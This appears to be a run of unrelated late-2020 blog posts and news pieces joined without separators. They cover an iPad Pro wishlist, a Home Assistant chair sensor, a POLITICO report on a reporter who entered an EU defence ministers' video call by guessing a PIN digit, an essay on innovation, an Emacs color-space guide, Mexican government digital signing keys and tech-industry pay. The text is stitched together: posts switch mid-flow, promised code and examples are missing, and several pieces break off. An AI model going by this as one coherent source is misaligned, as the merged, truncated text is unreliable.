<p>Just as Apple left us with great expectations for its Pro Mac line-up, the latest iPad Air also raises the bar in new and interesting ways. The Air served as sort of an appetizer for the new M1 chips, while also receiving a generous trickle-down of features from the iPad Pro, including USB-C and support for the latest keyboard and Pencil accessories. There have been rumors of new mini-LED displays for the next-gen iPad Pros, but it’s going to take a lot more than new display tech to set the Pros apart.</p>



<p>Francisco Tolmasky (<a href="https://twitter.com/tolmasky/status/1330033394349125642?s=20">@tolmasky</a>) recently tweeted:</p>



<blockquote><p>“A sad but inescapable conclusion from the impressive launch of the M1 is just how much Apple squandered the potential of the iPad. The iPad has had amazing performance for awhile, so why is the M1 a game changer? Because it’s finally in a machine we can actually <em>do things on</em>.”</p></blockquote>



<p>Francisco is right: Power and performance aren’t the bottleneck for iPad, and haven’t been for some time. So if raw power isn’t enough, and new display tech isn’t enough, where does the iPad go from here? Will it be abandoned once more, lagging behind the Mac in terms of innovation, or will Apple continue to debut its latest tech in this form factor? Is it headed toward functional parity with the Mac or will it always be hamstrung by Apple’s strict App Store policies and seemingly inconsistent investment in iPadOS?</p>



<p>It’s clear that Apple <em>wants</em> the iPad Pro to be a device that a wide variety of professionals can use to get work done. And since so many people use web apps for their work, the introduction of “desktop” Safari for iPad was an important step toward that goal. The Magic Keyboard and trackpad was another step.</p>



<p>Here are ten more steps I believe Apple could and should take to help nudge the iPad into this exciting next era of computing.</p>



<ol><li>Give the iPad Pro another port. Two USB 4.0 ports would be lovely.</li><li>Adopt a landscape-first mindset. Rotate the Apple logo on the back and move the iPad’s front-facing camera on the side beneath the Apple Pencil charger to better reflect how most people actually use their iPad Pros.</li><li>Introduce Gatekeeper and app notarization for iOS. The process of side-loading apps should <em>not</em> be as simple as downloading them from the App Store. Bury it in Settings, make it slightly convoluted, whatever: just have an officially-sanctioned way of doing it.</li><li>Ruthlessly purge the App Store Guidelines of anything that prevents the iPad from serving as a development machine. Every kind of development from web to games should be possible on an iPad. And speaking of games—emulators should be allowed, too.</li><li>Release a suite of professional first-party apps at premium prices. If someone can edit 4K videos in Final Cut on their M1 MacBook Air, they should be able to edit 4K videos in Final Cut on their iPad Pro. I refuse to believe that these pro apps can’t be re-imagined and optimized for a touch experience. If Apple leads the way in developing premium software for iPad, others will follow.</li><li>Make it possible to write, release, and install plug-ins (if appropriate) for the aforementioned first party apps.</li><li>Bring App Library to the iPad and allow widgets to be positioned anywhere on the Home Screen. This isn’t groundbreaking, it just annoys the heck out of me.</li><li>Release a new keyboard + trackpad case accessory that allows the iPad to be used in tablet mode without removing it from the case.</li><li>Introduce Time Machine backups for iPadOS.</li><li>5G, ofc.</li></ol>



<p>In the end, fostering a vibrant community of iPad app developers can only stand to benefit the Mac (and vice-versa).</p>



<p>It’s simple: people love their iPads. They love them so much they wish they could do even more with them. The new M1 Macs should give iPad fans reason to be excited; now that we’ve seen hints of what future Macs can be, it’s time for the iPad to reassert itself—to remind us once again who it’s for, and what makes it special.</p>



<p>In other words: Your move, iPad.</p>

We tend to sit more and take less breaks than we would usually do in an office, and over time that takes a toll on our backs and necks. I thought I fixed this by buying a standing desk, but I was wrong. The problem is that I usually forget to raise the desk so I sit in my chair for more than an hour until I feel pain in my back, and that's when I remember that I should stand up. So how do I fix this? An alarm that would ring every hour would do just fine, but it's not very accurate. What if I'm not in the office? What if I'm working at night? Do I really want to spend time setting alarms? No!</p>
<p>I like to automate things so I found a solution for this as well. The only thing I had to do was to place a contact sensor under my chair, and each time I would sit down it would report its state to Home Assistant. From there on I could create whatever automation I wanted. In my case, after 50 minutes of sitting down, I'll have Alexa notify me that I must stand up, and insist every 5 minutes if I'm still sitting down. Here's how I did it.</p>
<h3 id="step-1-place-the-contact-sensor">Step 1: Place the contact sensor</h3>
<p>I found that when I sit on the chair, the seat will go down a bit, so I just need to find the perfect place for my contact sensor so that it will get close enough when I sit down. Also, I would like it to remain closed when I lean on my back, because that still counts as sitting down (and a bad position for my back). After a few trials I found the perfect position, here's how it looks for an Aeron chair.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605726474455/QzkPW8PnI.png?auto=format&amp;q=60" alt="Contact sensor"></p>
<p>The small magnet can be glued on top of the chair using its original sticker and it will hold just fine. The best part is that you can hardly see them when you look from above, not that it would matter that much.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605726513434/djOgkYFR8.png?auto=format&amp;q=60" alt="Aeron Chair"></p>
<h3 id="step-2-add-it-to-home-assistant">Step 2: Add it to Home Assistant</h3>
<p>This is where the fun begins. The first thing you have to do is to connect your sensor to Home Assistant, the way you do this depends on your hardware. In my case, I have a Conbee II so I have to pair my Zigbee sensor with it, then it will appear in Home Assistant as a Binary Sensor. I then created a template sensor just for fun. It has two states: "Sitting down" and "Standing up", here's how the code looks like:</p>
<p>I made a YouTube video where you can see how it works:</p>

<p>European defense ministers did not expect to be chatting with Daniël Verlaan when they logged into what they thought was a confidential video conference. </p>



<p>Using login information shared on one of the defense ministers' Twitter accounts, the Dutch 31-year-old reporter <a href="https://www.politico.eu/article/dutch-reporter-gatecrashes-eu-defense-ministers-videoconference/">gatecrashed their meeting on Friday</a>, creating a moment of comic relief — combined with a security alert — at a meeting where a classified document on threats facing the EU was on the agenda.</p>



<p>"I don't think I look like a spy. So I understand why ministers were laughing," Verlaan, who works for Dutch media outlet RTL Nieuws, told POLITICO in a call Monday.</p>



<p>The incident exposed problems with the tools that European officials have used to carry on their work during the coronavirus pandemic. It also raises questions about how slowly the Council of the EU has moved to roll out secure conferencing, eight months into the pandemic.</p>



<p>"The fact that you're a minister of defense doesn't mean you're a cybersecurity expert," Verlaan said. "Everyone can make this mistake and that's why I think it's so important to warn people about this."</p>



<h3>Joining the call</h3>



<p>Across the world, governments have struggled to adapt to new platforms and systems, with troubling and embarrassing incidents along the way. In March U.K. Prime Minister Boris Johnson <a href="https://www.bbc.com/news/technology-52152025" target="_blank">tweeted a picture</a> of the "first ever digital" cabinet meeting on Zoom, divulging what security experts said was sensitive information. <a href="https://www.bbc.com/news/technology-53667664" target="_blank">Court hearings</a>, <a href="https://threatpost.com/zoom-bombing-attack-hits-u-s-government-meeting/154903/" target="_blank">parliamentary sessions</a> and <a href="https://www.npr.org/2020/04/09/829265445/zoombombing-city-hall-the-struggle-to-keep-public-meetings-going-virtually?t=1606124710773" target="_blank">local government meetings</a> have also fallen victim to poor security practices and unwanted intrusions this year.</p>



<p>In Friday's incident, a member of Dutch Defense Minister Ank Bijleveld's staff <a href="https://twitter.com/danielverlaan/status/1329799677827551233/photo/1" target="_blank">tweeted a picture</a> containing the web address of the meeting. The URL displayed the meeting ID and five of the six digits needed to access the meeting. </p>



<p>After receiving a tip about the vulnerability, Verlaan and a political reporter at RTL contacted the Dutch government and were told the meeting was still secure because the Council verified specific participants via webcam before allowing them to join, he said. </p>



<p>Verlaan decided to call the bluff. "I entered the URL, clicked okay and saw a screen asking for a pin code. The first five I knew, I entered them and added a '1,' then a '2' and eventually I bumped into the meeting," he said.</p>



<p>Footage obtained by POLITICO showed Verlaan in a large window at the top of the videoconference screen, dressed in a black T-shirt, grinning and waving to the ministers — some of whom laughed off the breach — as EU foreign policy chief Josep Borrell told him in a brief exchange he should leave immediately.</p>



<figure><div>

</div></figure>



<p>The incident puts a spotlight on the EU Council's security practices, as the EU institution is forced to discuss issues of defense, security, trade and other sensitive topics on platforms it acknowledges to be unsafe.</p>



<p>"We have all the time been conscious of, and have warned that, videoconferences ... are vulnerable from a security point of view," a Council official told POLITICO Friday, adding this was one reason they are "not formal Council meetings and no classified matters can be discussed."</p>



<p>"In September this year, the General Secretariat of the Council proposed the introduction of a new and more secure videoconference system, which is currently being&nbsp;considered by member states," the official said.</p>



<p>The fact that the meeting's URL contained the login information should be a cause for concern, Verlaan said.</p>



<h3>'I do illegal things for my job'</h3>



<p>The incident could have consequences for Verlaan. The Council official said the "intrusion" was illegal and "will be reported to the authorities."</p>



<p>As of Monday, the Dutch journalist said he had not heard from law enforcement. A Council official declined to say whether Verlaan had been reported to the authorities. The Dutch ministry of defense deferred questions about potential legal steps to the EU.</p>



<p>Either way, Verlaan is aware of the legal implications his reporting can have, he said.</p>



<p>"I regularly do illegal things for my job because I have to demonstrate that something is wrong, that there is misconduct or something is amiss," he said. "For example, take a company that got hacked and whose data is online: It's illegal to access that data, but at the same time I have to verify this data and inform the company about what data leaked."</p>



<p>Earlier this month Verlaan <a href="https://www.rtlnieuws.nl/tech/artikel/5195897/erasmusbrug-gehackt-verlichting-kleurtje-roze" target="_blank">got access</a> to the IT infrastructure of a bridge in Rotterdam and managed to change the lighting on the bridge, due to a vulnerability in how the bridge was connected to the internet. In October he <a href="https://www.rtlnieuws.nl/nieuws/nederland/artikel/5187220/jeugdriagg-kenter-jeugdhulp-datalek-dossiers" target="_blank">gained access</a> to medical files of minors who underwent psychotherapy due to a failure to properly secure an old website ran by a Dutch health care organization.</p>



<p>Verlaan said his reporting was always backed by RTL's editorial management and its legal service. But he added that he had not sought clearance beforehand for intrusion into the EU defense ministers' meeting  because he was just checking if authorities had been truthful about the security settings.</p>



<p>"By demonstrating, in a light-hearted way, an inoffensive way, a problem that's actually serious, I feel that's the best way to create awareness about the dangers online," he said.</p>

                    <p>For the last 60 years, we’ve seen consistently low productivity growth rates in the US and across the Western world. Meanwhile, recent scientific discoveries seem to be <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">less fundamental</a> to our understanding of the world than previous breakthroughs have been. While the growth of digital technology has been tremendous since the 1990s, it’s the only significant part of our world that seems to have been changing. To look up from our smartphones is to see a physical environment that looks basically the same as it did in 1970. Innovation has been constrained to the world of bits and left the world of atoms mostly untouched.</p><p>This might finally be changing. Last month, the economist Tyler Cowen <a href="https://www.bloomberg.com/opinion/articles/2020-10-05/how-much-worse-can-things-get-that-question-may-be-a-good-sign">speculated</a> that we may be seeing signs that this <a href="https://www.amazon.com/Great-Stagnation-Low-Hanging-Eventually-eSpecial-ebook/dp/B004H0M8QS">Great Stagnation</a> is ending. Since his article was published, we’ve already seen almost a dozen announcements that have only driven home the point further. There seem to be cracks in the Great Stagnation and light is peeking through on the other end. </p><p><strong>Innovation in the physical world</strong><br>Most obviously, the recent announcement of the <a href="https://www.statnews.com/2020/11/09/covid-19-vaccine-from-pfizer-and-biontech-is-strongly-effective-early-data-from-large-trial-indicate/">successful development of several vaccines</a> to the novel coronavirus are a sign that America (with some help from Germany) is still capable of achieving Big Things when we are pushed to it. Despite consistent failings of the US regulatory state in <a href="https://slatestarcodex.com/2020/04/14/a-failure-but-not-of-prediction/">delaying the adoption</a> of face masks and in <a href="https://thedispatch.com/p/timeline-the-regulationsand-regulatorsthat">slowing the rollout</a> of mass testing, the US essentially bet the farm that our strong biotech clusters would be able to create a vaccine to a new disease in record time, and it looks like we’re going to be able to do it in under a year! </p><p>It’s worth highlighting just how speedy this development timeline is when compared to the vaccines for diseases like polio and measles. </p><figure><img src="https://www.agglomerations.tech/content/images/2020/11/Vaccination-innovation-chart.png" alt="" srcset="https://www.agglomerations.tech/content/images/size/w600/2020/11/Vaccination-innovation-chart.png 600w, https://www.agglomerations.tech/content/images/size/w1000/2020/11/Vaccination-innovation-chart.png 1000w, https://www.agglomerations.tech/content/images/size/w1600/2020/11/Vaccination-innovation-chart.png 1600w, https://www.agglomerations.tech/content/images/size/w2400/2020/11/Vaccination-innovation-chart.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>https://ourworldindata.org/vaccination</figcaption></figure><p>And not only did we develop a new vaccine, we developed a new *type* of vaccine. mRNA vaccines have long been speculated to work, but this is the <a href="https://www.bostonherald.com/2020/11/20/pfizer-and-moderna-vaccines-showing-potential-success-of-mrna-platform-a-first/">first instance</a> of a successful vaccine application in humans using this technique. </p><p>In transportation, the promise of driverless cars has long been a centerpiece for a tech-optimistic vision of safer roads, better-designed cities, and eliminating the drudgery of a morning commute through traffic. But the technical delays of the last few years (when compared to the most optimistic timelines) have become a rallying cry for the <a href="https://blog.piekniewski.info/2018/05/28/ai-winter-is-well-on-its-way/">tech-skeptic</a> as well. </p><p>It seems like they may finally be getting here. A few weeks ago, <a href="https://arstechnica.com/cars/2020/10/waymo-finally-launches-an-actual-public-driverless-taxi-service/">Waymo announced</a> that their long-running pilot program in Arizona is going to be open to the public <a href="https://twitter.com/jjricks_/status/1316318196375330816">without any safety driver</a> in the front seat. Days later, Elon Musk and Tesla rolled out a new self-driving beta program. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">These two guys used a drone to make a video of Tesla's new "full self-driving" software in action. The drone, the self-driving car, and the global video-steaming service were all been science fiction when I was born. Living in the future is neat. <a href="https://t.co/4QqGcjFXsc">https://t.co/4QqGcjFXsc</a></p>— Timothy B.

</figure><p>This is a remarkable engineering feat, especially on Waymo’s end. It shows the company can successfully lead product development in an industry that relies on more stringent safety-critical engineering instead of the release-and-iterate model that its parent company grew up with. Waymo is evidence that Silicon Valley can “move at a moderate pace and not break things” when it needs to.</p><p>Granted, it’s unclear how long until and at what pace deployment of AVs to the rest of the country and the world will happen. If the Waymo model looks to be successful, it will be a steady, resource-intensive process of region-by-region expansion as the cars learn to handle new operational design domains and are rigorously validated in each city before the keys are turned over to the AI. In other words, expansion could look more like a cell phone coverage map than a software update that is instantaneously available everywhere. </p><p>But still, this is a significant, tangible mile marker that the industry has passed. AVs are operating in the wild now. We get to talk about *when* we reach the driverless future, not *if*. </p><p>In addition to the almost ho-hum daily progress in solar, wind, and battery technology where prices have fallen <a href="https://www.greentechmedia.com/articles/read/solar-pv-has-become-cheaper-and-better-in-the-2010s-now-what">90</a>, <a href="https://www.forbes.com/sites/energyinnovation/2020/01/21/renewable-energy-prices-hit-record-lows-how-can-utilities-benefit-from-unstoppable-solar-and-wind/?sh=491f10ec2c84">70</a>, and <a href="https://about.bnef.com/blog/battery-pack-prices-fall-as-market-ramps-up-with-market-average-at-156-kwh-in-2019">87</a> percent over the last ten years, we’ve also started to hear very promising reports about the development of more fundamental breakthroughs. The NYT reports that a compact nuclear fusion reactor is “<a href="https://www.nytimes.com/2020/09/29/climate/nuclear-fusion-reactor.html?action=click&amp;module=News&amp;pgtype=Homepage">Very Likely to Work</a>” after a major theoretical advancement. There was also a fantastic David Robert’s <a href="https://www.vox.com/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">deep dive into geothermal energy</a> and the promise of advanced geothermal (whereby water pumped into the ground through a closed loop reaches a high enough temperature that it becomes “supercritical” and can carry 10x more energy per unit mass), in particular. Either technology, if perfected, would provide abundant, zero-carbon, baseload energy that is available anywhere around the world. </p><p>Cowen mentions briefly the huge market growth we’ve seen in lab-grown meat and plant-based alternatives. A few weeks ago it was announced that Impossible Foods, one of the largest actors in the industry is <a href="https://venturebeat.com/2020/10/20/impossible-foods-will-double-rd-to-eliminate-animal-farming/">doubling their R&amp;D team</a> as they seek to take on plant-based milk, steak, and fish as well as improve the supply chains for plant proteins. In tandem, McDonald’s <a href="https://www.washingtonpost.com/food/2020/11/10/mcdonalds-mcplant-sandwich/">just announced</a> that in 2021 they are going to be testing out a new McPlant menu.</p><p><strong>Digital innovation continues apace</strong></p><p>Not to be left out, in the digital world we’ve been seeing impressive progress as well. AI techniques like deepfakes which have been heralded as the <a href="https://www.sundayguardianlive.com/opinion/deepfakes-destroy-democracy">death knell for democracy</a> are now being <a href="https://arstechnica.com/gadgets/2020/11/nvidia-used-neural-networks-to-improve-video-calling-bandwidth-by-10x/">deployed by NVIDIA</a> to increase video fidelity while cutting bandwidth transmission for video calls by a factor of 10. In general, techniques to reduce bandwidth use are greatly underrated, and it’s going to be exciting to see the ways in which smarter compression can perhaps bring similar efficiency gains across the board. </p><p>And now factor in the steady rollout of 5G network technologies which promise to increase the raw bandwidth available to all mobile devices. With the combination of smarter compression and vastly increased bandwidth we could be looking at a baseline 50x increase in network capacity over the next decade. It’s hard to predict ahead of time what new applications will be enabled by all this new capacity, but in retrospect it could look like another example of <a href="https://diff.substack.com/p/how-bubbles-and-megaprojects-parallelize">parallel innovation</a> that both enables and is driven by the growth of VR/AR, driverless vehicles, and telehealth.*</p><p><em>*For those who are skeptical that increased capacity will generate new applications because a few cities have tried gigabit broadband<a href="https://www.wsj.com/graphics/faster-internet-not-worth-it/"> without much effect</a>, I would argue that both hardware and app developers are optimizing for the baseline user experience and we won’t see a ton of investment in new applications until we’ve changed the baseline capacity that developers can expect a sizeable user base to have. </em></p><p>Equally as impressive, Apple’s new M1 chip that was launched on November 10th seems to have taken the world by storm. As John Gruber <a href="https://daringfireball.net/2020/11/the_m1_macs">summarizes</a>: “To acknowledge how good they are — and I am here to tell you they are astonishingly good — you must acknowledge that certain longstanding assumptions about how computers should be designed, about what makes a better computer better, about what good computers need, are wrong.” Just as interesting is <a href="https://medium.com/pcmag-access/what-is-the-apple-m1-chip-613935ea0903">how they did it</a>. By miniaturizing the whole system architecture and integrating it onto a single chip (no discrete RAM, graphics card, etc.) Apple has managed to pump out massive efficiency gains both in processing power and in battery life. (There’s perhaps a metaphor here for the <a href="https://www.wsj.com/articles/breaking-up-big-tech-is-hard-to-do-1532290123">value of integration</a> for large tech firms as well…)</p><figure><img src="https://lh5.googleusercontent.com/tXP4ZnW93TIsJ_dJe3NVmevfz5eMUnNC6CS40Dz_S0568BDiQKr8K8LqT5Ja-kLnXUKnS1UkDQf_6WYzBhfGa4c99lQDfqudhQaDF-XCYBEkxNoP3Vo3FlGtLl3sGFQcdtHBlGbv" alt=""><figcaption>https://techcrunch.com/2020/11/17/yeah-apples-m1-macbook-pro-is-powerful-but-its-the-battery-life-that-will-blow-you-away/</figcaption></figure><p>Finally, the virtual reality space has seen its most impressive entrant in years with the arrival of the Quest 2 from Facebook on October 13th. There is no VR headset that matches it on a performance/cost basis, and the relative simplicity and elegance of the system makes it an ideal entry point. The deliberately low entry barrier of $299 is meant to entice a large enough user base that it kickstarts the virtuous cycle of having a significant enough market for dedicated VR developers to make significant investments in new applications, which then drives new user growth. Facebook believes we finally have a minimum viable product for VR that means this kind of two-sided market is possible, and it is betting billions of dollars to make it happen. Early signs seem to show that it is working as intended with <a href="https://www.theverge.com/2020/10/30/21541535/oculus-quest-2-preorders-sales-developers-zuckerberg">pre-orders reportedly 5x</a> larger than the original Quest, popular applications like Beat Saber seeing record growth, and all this with the upcoming holiday rush and a massive advertising blitz to come. </p><p>Notably, all of these announcements/developments I’ve outlined have occurred in just the last few months. This is by no means a comprehensive look at the exciting progress being made in many other fields. But the sheer scope and pace of tangible changes to our physical and digital words is something to be excited about.</p><p><strong>A few caveats </strong></p><p>Some of these innovations will boost productivity in the traditional ways that show up in economic growth statistics. We should strive for and celebrate those achievements. But some of these innovations won’t necessarily, instead they make human civilization more durable and sustainable in a variety of ways.

While economic statistics won’t show a boost in productivity compared to the pre-COVID economy because of the vaccine, the ability to return to trend is itself incredibly valuable.

<p>
In July 2020 I went on a color-scheme vision quest. This led to some research on various <a href="https://en.wikipedia.org/wiki/Color_space">color spaces</a> and their utility, some investigation into the <a href="http://chriskempson.com/projects/base16/#styling-guidelines">styling guidelines</a> outlined by the base16 project, and the <a href="https://github.com/emacs-mirror/emacs/blob/master/lisp/color.el">color utilities</a> that ship within the GNU Emacs text editor. This article will be a whirlwind tour of things you can do to individual colors, and at the end how I put these blocks together.
</p>

<div id="text-h-3fe0b0c6-76a6-4e9e-a061-66bd3ba54620">
<p>
I've been a part of several Linux desktop customization communities since circa 2013. One big aspect of that is the colors used across various contexts – for me, it follows that part of the game is trying to make a cohesive system of colors that relate to each other in an understandable (and thus tweakable) way – know what I can do to individual colors when making a "color framework" helps immensely.
</p>

<p>
I'm colorblind. This means I might be really picky about some colors. For example, I don't like the color red used for emphasis in text – thin red lines look the same as thin black lines to me (and so, red text doesn't typically &gt;POP&lt; for me, unless it's bold or has some other emphasis included).
</p>

<p>
Bootstrapping builders exist for base16! If I can bootstrap on top of their system I get a lot of free coverage within the software ecosystem.
</p>

<p>
Plus, I just find this sort of thing really fun. Visual feedback is pleasing. Finding the right colors makes my lizard brain return to monke.

This will be the focal point of inconsistency. The level of brightness, quality of screen, and ambient lighting level are all things that affect the value of the screen's <a href="https://en.wikipedia.org/wiki/White_point">white point</a>, which is what everything else is relative too. Luckily you can (attempt to) account for this as well.

<p>
Color spaces are ways of defining colors in different sets of properties. They are the main tool you will have for reasoning about tweaking <i>individual</i> colors. You can then mess with these and convert them back into a format you can render (typically RGB) within a <a href="https://en.wikipedia.org/wiki/Gamut">color gamut</a> (a range of supported colors). Here I will be pretty high level, focusing on some visuals for what sorts of things these properties look like. When I define the valid values for ranges, I will be using the scale I've implemented in my <a href="#h-cb3c6479-7d62-4028-8942-2b033bb1247a">helpers</a>.

The one you know and love:  [R]ed, [G]reen, [B]lue. Your knobs are amounts of each. As you turn everything up, you approach <code>#ffffff</code> (and down, -&gt; <code>#000000</code>). This isn't particularly flexible in "ways you can think about colors".
</p>

<p>
Here is a gradient from <code>#cc3333</code> to <code>#33cc33</code> to <code>#3333cc</code>:
</p>

 


<p>
To show the lighting effect, let's repeat the above gradient, but instead of using <code>33</code> for filler, we'll use <code>99</code> – that's triple(!) the secondary color amounts:

Saturation in HSL is a controlled version of chromacity ("distance from gray"). See the wiki section for more details.
</p>

</p>

<p>
Hue has several defined points (at rotating 60° angles), I like to think of it like a color compass:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSL: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Let's see the effect saturation has:
</p>

 


<p> HSL: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
And lightness:
</p>

 


<p> HSL: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p> 

</div>
</div>

<div id="outline-container-org758eb61">
<h3 id="h-c147b84d-d95b-4d2d-8426-2f96529a8428"><span>3.3</span> <a href="#h-c147b84d-d95b-4d2d-8426-2f96529a8428">HSLuv</a></h3>
<div id="text-h-c147b84d-d95b-4d2d-8426-2f96529a8428">
<p>
<a href="https://www.hsluv.org/comparison/">hsluv</a> is an altered version of HSL that tries to be perceptually uniform with regards to lightness. HSL lightness by comparison is hard to make contrast comparisons in.
</p>

<p>
What does that mean for us? Well, let's take our above examples and recreate them in the HSLuv space:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSLuv: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Saturation:
</p>

 


<p> HSLuv: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
Lightness:
</p>

 


<p> HSLuv: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p> 


<p>
These scales definitely look more consistent when reasoning about lightness values. HSL's hue feels all over the place by comparison – though at the same time that might be a more natural color mixing feel.
</p>

The white point is a defined <a href="https://en.wikipedia.org/wiki/Standard_illuminant">standard illuminate</a>  not intrinsic to the value of a color. It is an additional piece of information you provide to functions when converting into and out of the CIELAB colorspace.
</p>

<p>
The standard white point is defined as <code>d65</code> – in this section, every conversion will be made with <code>d65</code>. Here is a table of commonly used white points and their meaning (for values, see the bottom of the wikipedia link).

The knobs A and B allow you to play with the 4 primary colors of the LAB space. If you take a look at the values, you might notice that the more negative we go, we get "cooler" colors, while on the positive end, we get "warmer" colors.
</p>

<p>
Let's look at some LAB colors. The labels below will have the values of  <code>(L A B)</code> – Remember, A is green to red, B is blue to yellow (each with a value -100 to 100)

LCH is a "cylindrical" version of cieLAB. What that means for us is that Hue is different. Instead of 6 defined islands to sail to with our color compass, there are 4:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 90°</p>
<p>green, 180°</p>
<p>blue, 270°</p>
 </div> 


<p> LCH: Hue rotation 0-360 (step 90°), saturation 50%, luminance 50% </p> 


<p>
LCH lightness:
</p>
 


<p> LCH: lightness scale 0-100% (step 10%), chromacity 50%, hue 270° (blue) </p> 


<p>
Chromacity, "distance from gray" - very similar to Saturation (which I've seen cited as simply misnamed chromacity):
</p>

 


<p> LCH: chromacity scale 0-100% (step 10%), luminance 70%, hue 270° (blue) </p> 


<p>
Let's compare some spaces. We'll take some the RGB gradient from above, normalize the lightness in HSLuv and then maximize l[C]h, H[S]L, and H[S]Luv:
</p>

 


<p> original </p> 


 


<p> squash lightness to 50 in HSLuv </p>

Let's take a look at some different text contrasts! I will steal the backgrounds used here from the base-16 grayscale sets: <code>#f7f7f7</code> and <code>#101010</code>. For reference, the contrast ratio between <code>#000000</code> and <code>#ffffff</code> is 21.0

I think it's pretty clear from these examples that higher contrast goes a long way in dark color schemes.

Color distance is a measure of how far apart colors are by properties in spaces. For example, let's take the 'magenta' color from above, and increase it's brightness and hue until we're some minimal distance away. We'll aim for 33(out of 100) measured in the CIELAB space:

<p>31</p>
<p>35</p>
 </div> 


<p> CIELAB distance from the start color is shown </p> 


<p>
Color distance is useful because it lets us measure a kind of similarity between colors. You can use this to control where you stop transformations (color space property tweaks).

A gradient is where you travel from one color's initial property values to some other color's property values, collecting the intermediate steps.

<p>I recently graduated, and in order to get my official graduation title I needed to get my private and public key from the government. <strong>That’s right, you go to the government’s office, certify that you are who you are, and you’ll get a private and public key in an USB key from the government</strong> which you can use to do all your bureaucracy.</p>

<p>You also get a TaxID which is comprised of</p>

<p><img src="https://danielsada.tech/images/blog/rfc.png" alt="An image explaining the structure of RFC, the Mexican Tax ID."></p>

<p>With this key you can:</p>



<p>Want to get your passport? Sign in with your private key and password to the government portal and get it. Want your birth certificate? Get it online with your private key. Want to check your scholarship or any related paperwork? Just login online. This has made Mexican bureaucracy really good for the amount of people it handles. It specially astonishes me that it is instant, compared to most of the paperwork in the US which you have to mail stuff and it’s in ten thousand different places.</p>

<h2 id="get-your-digitally-signed-university-diploma">Get your digitally signed university diploma.</h2>

<p>You enter your key via a web portal, and you can then get a signed copy of your university diploma by the government, which then links to a public government page which certifies you are the holder of that diploma. You can use this to certify that someone is a doctor, or lawyer or whatever with this system. I can also print as many university diplomas from the government portal whenever I want, as they are just a digitally signed sheet of paper (with a QR with the public key).</p>

<h2 id="create-signed-invoices-of-goods-and-services-pay-taxes">Create signed invoices of goods and services &amp; pay taxes</h2>

<p>With your keys, you can also sign your invoices and guarantee that it is you who created them, and when you create a transaction, it automatically goes into the recipient’s Tax ID. That means, that at the end of the year, I just login into the government portal/whatever software I like, and it <strong>automatically calculates how many taxes I have to pay</strong>. I can also login with my key into the government’s website and pay my taxes with it.</p>

<h2 id="why-i-created-this-post">Why I created this post?</h2>

<p>I think <a href="https://www.youtube.com/watch?v=Erp8IAUouus">social security numbers are not ideal</a> and some of the government bureaucracy in the US still requires mail or checks or a physical office, this is merely inspiration or information hoping for something better.</p>

       <p><em>I consider the phenomenon of “Golden Handcuffs”, first as corporate perks, then as pay, then as Silicon Valley’s cost of living. I reject every explanation.</em></p>
<h3 id="Golden-Handcuffs-as-Corporate-Perks"><a href="#Golden-Handcuffs-as-Corporate-Perks" title="Golden Handcuffs as Corporate Perks"></a>Golden Handcuffs as Corporate Perks</h3><p>You get kombucha on tap, organic granola, a masseuse on staff. Soon enough, you forget your passions, get comfortable, and never leave.</p>
<p>I hear this all the time, but it doesn’t actually add up.</p>
<p>After a few years, an engineer at Google is <a target="_blank" rel="noopener" href="https://www.levels.fyi/">making around $350,000</a>. In contrast, <a target="_blank" rel="noopener" href="https://www.amazon.com/Remedy-Raw-Organic-Kombucha-Sparkling/dp/B07W7V7DRZ/ref=sr_1_12?dchild=1&amp;keywords=kombucha&amp;qid=1606035999&amp;s=grocery&amp;sr=1-12">organic kombucha is $0.14 an ounce</a>. So even if you’re drinking 12 ounces a day 240 days a year [1], that’s just $400, or 0.1% of total compensation. To frame that otherwise, one year’s salary could buy you a 1000 year supply of kombucha.</p>
<p>What about the other perks? <a target="_blank" rel="noopener" href="https://www.gr8nola.com/pages/about">Google’s granola supplier</a> sells to the public for <a target="_blank" rel="noopener" href="https://www.gr8nola.com/products/the-original?variant=13611271782490">$7.20 a pound</a>. I don’t think it’s reasonable to eat a pound of granola day, but if you really wanted to, it would still only cost $1,700 for 240 work days. A nice massage is maybe $100, so if you go once a month, that’s another $1,200. Lunch is a pretty big cost, say $20 per day, or $4,800 per year.</p>
<p>What about your home office? The <a target="_blank" rel="noopener" href="https://www.nytimes.com/wirecutter/reviews/best-office-chair/">Wirecutter office chair</a> is $1000, their <a target="_blank" rel="noopener" href="https://www.nytimes.com/wirecutter/reviews/best-4k-monitors/">4k monitor</a> is $500, and a <a target="_blank" rel="noopener" href="http://top-line/">top-line 16-inch MacBook Pro</a> is $4,500.</p>
<p>So that’s an annual cost of $8,100, or just 2.3% of total compensation. Plus an upfront cost of $6000, amortized over several years.</p>
<p>I have a really hard time believing this is why people fail to quit large companies.</p>
<h3 id="Golden-Handcuffs-as-Corporate-Pay"><a href="#Golden-Handcuffs-as-Corporate-Pay" title="Golden Handcuffs as Corporate Pay"></a>Golden Handcuffs as Corporate Pay</h3><p>If perks represent only a tiny fraction of total compensation, then surely it’s the compensation itself that’s keeping employees in check?</p>
<p>This also ends up being tough to swallow.</p>
<p>Let’s say you quit your job, apply to Y Combinator, get in, pitch at demo day, and raise a Series A. Great news! You now have millions of dollars in the bank and can pay yourself a market rate salary again.</p>
<p>The odds that things do not go this smoothly are <a href="https://applieddivinitystudies.com/wilbin-rationalists/">maybe 99-to-1 if you’re a randomly sampled founder</a>. [2]</p>
